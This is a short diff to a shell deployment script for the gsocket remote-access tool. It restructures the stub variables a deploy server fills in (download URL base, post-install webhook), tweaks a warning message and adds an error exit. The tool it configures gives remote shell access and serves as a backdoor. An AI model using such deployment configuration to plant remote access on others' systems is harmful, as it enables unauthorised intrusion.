@@ -74,6 +74,19 @@
 
 URL_BASE_CDN="https://cdn.gsocket.io"
 URL_BASE_X="https://gsocket.io"
+
+# -----BEGIN deploy_server.sh HOOK-----
+# These stubs are filled out by deploy_server.sh:
+IS_DEPLOY_SERVER=
+URL_BASE=
+[[ -n $URL_BASE ]] && [[ -z $GS_URL_BASE ]] && GS_URL_BASE="$URL_BASE"
+[[ -n $IS_DEPLOY_SERVER ]] && unset GS_BRANCH
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+# -----END deploy_server.sh HOOK-----
+
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
@@ -89,12 +102,6 @@ URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
 	URL_BIN_FULL="$URL_BIN"
 }
 [[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
-
-# STUBS for deploy_server.sh to fill out:
-gs_deploy_webhook=
-GS_WEBHOOK_404_OK=
-[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
-unset gs_deploy_webhook
 
 # WEBHOOKS are executed after a successfull install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
@@ -1148,7 +1155,7 @@ WARN_EXECFAIL()
 	ls -al "${DSTBIN}"
 	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
 --> GS_OSARCH=${OSARCH}
---> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> GS_DSTDIR=${DSTBIN%/*}
 --> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
 --> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
 --> Alternatively, try the static binary from
@@ -1797,6 +1804,7 @@ try_network()
 	FAIL_OUT
 	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
 	WARN_EXECFAIL
+	errexit
 }
 
 # install <osarch> <srcpackage>
